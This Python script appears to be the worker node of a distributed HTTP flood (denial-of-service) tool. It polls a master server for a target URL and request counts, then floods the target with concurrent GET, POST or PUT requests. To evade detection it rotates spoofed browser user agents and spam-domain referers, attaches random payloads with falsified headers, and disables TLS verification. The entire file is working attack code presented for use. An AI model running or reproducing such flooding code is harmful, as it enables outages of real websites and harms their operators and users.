# Libraries
import time
import random
import grequests
import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Constants
VERBOSE = True
METHOD = "GET"
MASTER_URL = "http://127.0.0.1:5000"
WAIT_TIME = 5
TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
REFERERS = [
    "1-best-seo.com",
    "1-free-share-buttons.com",
    "100-reasons-for-seo.com",
    "100dollars-seo.com",
    "12-reasons-for-seo.net",
    "12masterov.com",
    "12u.info",
    "15-reasons-for-seo.com",
    "1kreditzaim.ru",
    "1pamm.ru",
    "1st-urist.ru",
    "1webmaster.ml",
    "1wek.top",
    "1winru.ru",
    "1x-slot.site",
    "1x-slots.site",
    "1xbet-entry.ru",
    "1xbetcc.com",
    "1xbetonlines1.ru",
    "1xbetportugal.com",
]


# Function to show messages
def show_message(message):
    if VERBOSE:
        print(message)


# Function to create requests
def create_request(method, target_url, timeout, user_agent, referer):
    content_length = random.randint(1, 500)
    payload = {"x": random.randbytes(content_length)}
    headers = {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Keep-Alive": str(random.randint(5, 1000)),
        "Content-Type": "application/json",
        "Content-Length": str(content_length),
        "Referer": referer,
    }

    match method:
        case "GET":
            return grequests.get(
                target_url, headers=headers, verify=False, timeout=timeout
            )
        case "POST":
            return grequests.post(
                target_url, headers=headers, data=payload, verify=False, timeout=timeout
            )
        case "PUT":
            return grequests.put(
                target_url, headers=headers, data=payload, verify=False, timeout=timeout
            )
        case _:
            raise ValueError("Invalid method")


def init_attack(
    method, target_url, timeout, wait_time, total_requests, concurrent_requests
):
    # Create requests
    show_message(f"Creating {total_requests} requests...")
    requests_list = [
        create_request(
            method,
            target_url,
            timeout,
            random.choice(USER_AGENTS),
            random.choice(REFERERS),
        )
        for n in range(total_requests)
    ]
    show_message("Requests created successfully.\n")

    # Send requests
    show_message(f"Sending {concurrent_requests} requests...")
    for index, response in grequests.imap_enumerated(
        requests_list, size=concurrent_requests
    ):
        try:
            if response.status_code == 200:
                show_message(f"The request {index} was sent successfully.")
        except AttributeError:
            show_message(f"The request {index} could not be sent.")

    # Wait before continuing
    show_message(f"Waiting {wait_time} seconds before continuing...\n")
    time.sleep(wait_time)


# Main function
if __name__ == "__main__":
    while True:
        try:
            # Check if the master is ready
            response = requests.get(MASTER_URL, timeout=TIMEOUT)
            status_code = response.status_code

            # Check if the master is ready
            if status_code == 200:
                # Get the attack data
                attack_data = response.json()
                start_attack = attack_data.get("total_requests", 0) > 0

                # Start the attack
                if start_attack:
                    show_message(
                        f"Starting the attack on {attack_data['target_url']}..."
                    )
                    show_message(
                        f"Sending {attack_data['total_requests']} requests each {attack_data['wait_time']} seconds...\n"
                    )
                    init_attack(**attack_data)
                else:
                    show_message(
                        "The master is ready but there are no requests to send."
                    )
                    show_message(
                        f"Waiting {WAIT_TIME} seconds before trying again...\n"
                    )
            else:
                show_message(f"The master responded with status code {status_code}.")
                show_message(f"Waiting {WAIT_TIME} seconds before trying again...\n")
        except requests.exceptions.RequestException:
            show_message(f"The master isn't available.")
            show_message(f"Waiting {WAIT_TIME} seconds before trying again...\n")
        except KeyboardInterrupt:
            show_message("The process has been stopped.")
            break
        except Exception as error:
            show_message(f"An unexpected error occurred: {error}")
            break

        # Wait before trying again
        time.sleep(WAIT_TIME)
